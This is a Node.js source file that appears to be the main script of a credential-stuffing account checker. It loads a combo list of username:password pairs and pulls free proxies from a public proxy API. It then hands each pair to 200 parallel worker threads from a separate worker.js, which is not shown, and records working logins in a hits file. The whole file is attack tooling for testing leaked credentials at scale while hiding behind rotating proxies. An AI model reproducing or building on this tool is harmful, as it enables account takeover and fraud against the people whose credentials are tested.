var os = require('os');
const prompt = require('prompt-sync')();
const numCPUs = os.cpus().length;
var dialog = require('dialog-node');
var fs = require('fs');
var OS = os.platform();
var selectfolder = require('win-select-file');
const eol = require("eol")


const wrker= require('worker_threads');
const Worker = wrker.Worker;
const num_workers = 200;

var accounts=[];
var proxylist=[];
var rproxylist=[];
var finish_cproxy = false;

function getAccount(){
	//if accounts is empty
	if (!Array.isArray(accounts) || !accounts.length) {
		return {exit:true};
	}
	
	return accounts.shift();
}
function getrProxy(){
	//if rproxylist is empty
	if (!Array.isArray(rproxylist) || !rproxylist.length) {
		finish_cproxy=true;
		return {exit:true};
	}
	
	return rproxylist.shift();
}
function rnum(min, max) {  
  return Math.floor(
    Math.random() * (max - min + 1) + min
  )
}


async function setup(){
	
	fs.mkdir('./results', { recursive: true }, (err) => {
	  if (err) throw err;
	});
	fs.writeFile("./results/hits.txt", "", function(err) {}); 
	fs.writeFile("./results/info.txt", "", function(err) {}); 

	
	
	if(OS != "linux" && OS != "darwin" && OS != "win32"){
		console.log("unknown OS: ", OS);
		process.exit(9);
	}
	var path="";
	console.log(" Detected : ",OS);
	if(OS == "linux" || OS == "darwin"){
		path = prompt('Enter the path of the combo list: ');
		
	}else if(OS == "win32"){
		console.log("Select combo list: ");
		
		const root = 'c://';
		const description = "";
		const newFolderButton = false;
		path = await selectfolder({root, description, newFolderButton});
		path=path[0]
	}

	fs.access(path, fs.constants.F_OK, (err) => {
		//console.log(`${path} ${err ? 'does not exist' : 'exists'}`);
		if(err == null){
			fs.stat(path, (error, stats) => {
			  if (error) {
				console.error(error);
				return;
			  }

			  if(stats.isDirectory()){
				  console.log("This is a directory!");
				  process.exit(9);
			  }
			  if(path.substring(path.length - 3)!='txt'){
				  console.log("This is not a txt file!");
				  process.exit(9);			  
			  }
			});
		}else{
			console.log(`${path} does not exist`);
			process.exit(9);
		}
	});



	//read combo list
	var data = fs.readFileSync(path, "utf8");
	let rawaccounts = eol.split(data);
	rawaccounts.forEach(function(account) {
		const acctsplit = account.split(':');
		accounts.push ( [acctsplit[0],acctsplit[1]] );
	})
	console.log(accounts);
	
	/*
	//proxies
	let numaccounts = accounts.length;
	if(numaccounts > 13086){
		//use all proxies
		for( let i = 1; i<=18; i++){
			data = fs.readFileSync("./http_proxies/"+i.toString()+".txt", "utf8");
			rawdata = eol.split(data);
			rproxylist = rproxylist.concat(rawdata)
		}
	}else{
		const num_proxyFiles = Math.ceil(numaccounts/727);
		for( let i = 0; i<num_proxyFiles; i++){
			data = fs.readFileSync("./http_proxies/"+rnum(1,18).toString()+".txt", "utf8");
			rawdata = eol.split(data);
			rproxylist = rproxylist.concat(rawdata)
		}
	}
	console.log(rproxylist);
	*/
	
	//api proxies
	const axios = require("axios");
	const config = {
		method: "GET",
		//url: "https://www.proxy-list.download/api/v1/get?type=http"
		url: "https://api.proxyscrape.com/?request=getproxies&proxytype=https&timeout=3000"
	};
	var resp = await axios.request(config);
	rproxylist = eol.split(resp.data);
	console.log(rproxylist);
	
	//checkproxies();
	proxylist=rproxylist;
	run();
	
}
	
/*
async function checkproxies(){
	
	//check proxies (spawn workers)
	const proxythreads = 200;
	const proxyworkers = [];
	for (let i = 0; i < proxythreads; ++i) {
		const new_worker = new Worker('./proxycheck_worker.js');
		
		/*

		//console.log('new proxy worker ' + i);
		proxyworkers.push(new_worker);
	}
	//make it so that when workers are done, send another proxy
	for (let i = 0; i < proxythreads; ++i) {	
		proxyworkers[i].on('message', (message) => {
		  //console.log(message);
		  if(message!="bad"){
			  proxylist.push(message);
		  }
		  proxyworkers[i].postMessage(getrProxy());
		});
	}
	
	for (let i = 0; i < proxythreads; ++i) {	
		proxyworkers[i].postMessage(getrProxy());
	}
	
}
*/

async function run(){
	//spawn workers
	const workers = [];
	for (let i = 0; i < num_workers; ++i) {
		const new_worker = new Worker('./worker.js', { workerData: proxylist });
		
		new_worker.on('exit', (code) => {
			console.log(`[Thread exit]: Code ${code}`);
		});		
		console.log('new worker ' + i);
		workers.push(new_worker);
	}
	
	

	//make it so that when workers are done, send another account
	for (let i = 0; i < num_workers; ++i) {	
		workers[i].on('message', (message) => {
		  //console.log(message);
		  if(message != "bad"){
			  //write to file
				fs.appendFile('./results/hits.txt', message.combo+"\n", function (err) {});
		  }
		  workers[i].postMessage(getAccount());
		});
	}
	
	for (let i = 0; i < num_workers; ++i) {	
		workers[i].postMessage(getAccount());
	}
}
/*
var cp_timeout;
function checkproxy_finish() {
    if(finish_cproxy==false) {//if not done
        cp_timeout=setTimeout(checkproxy_finish, 500);//wait half sec then recheck
        return;
    }else{
		console.log("Done checking proxies");
		console.log(proxylist);
		try{
			clearTimeout(cp_timeout);
		}catch(e){}
	}
}
*/
	
(async () => {
	setup();
		
	//no need to check proxies lol, if it doesnt work ,just get another one
	//checkproxy_finish();

	//run();
})()




